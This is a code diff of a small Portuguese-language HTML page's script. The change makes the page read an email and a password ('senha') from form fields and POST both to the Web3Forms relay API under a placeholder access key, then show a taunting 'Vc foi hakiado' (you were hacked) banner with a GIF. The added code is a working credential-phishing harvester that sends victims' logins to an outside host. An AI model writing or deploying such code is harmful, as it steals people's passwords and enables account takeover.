@@ -98,20 +98,31 @@
 
 
     <script>
-        function Clicar(){
-            var valor1 = document.querySelector('#capturar')
-            var valorPegado = valor1.value
-            console.log(valorPegado)
-            var element = document.querySelector('#valorviado')
-            if(valor1==undefined){
-                alert('coloque algo')
-            }
-            else{
-            element.innerHTML=`<h2> Vc foi hakiado <span>😈${valorPegado}😈!!<span>   </h2> <img src="https://media.giphy.com/media/xULW8rv9NSbHaEe9Ak/giphy.gif">`
-            element.style.backgroundColor =  'rgb(136, 132, 132)';
-           
-            }
+            function Clicar(){
+        var valor1 = document.querySelector('#capturar')
+        var valorPegado = valor1.value
+        var valorSenha = document.querySelector('#senha').value
+        var element = document.querySelector('#valorviado')
+
+        if(valor1.value == ""){
+            alert('coloque algo')
+            return
         }
+
+        // envia os dados para o Web3Forms
+        fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                access_key: "SUA_ACCESS_KEY_AQUI",
+                email: valorPegado,
+                senha: valorSenha
+            })
+        });
+
+        element.innerHTML = `<h2> Vc foi hakiado <span>🔴${valorPegado}🔴</span>!!</h2> <img src="https://media.giphy.com/media/xULWBrv9NSbHaEe9Ak/giphy.gif">`
+        element.style.backgroundColor = 'rgb(136, 132, 132)';
+    }
     </script>
 </body>
 </html>
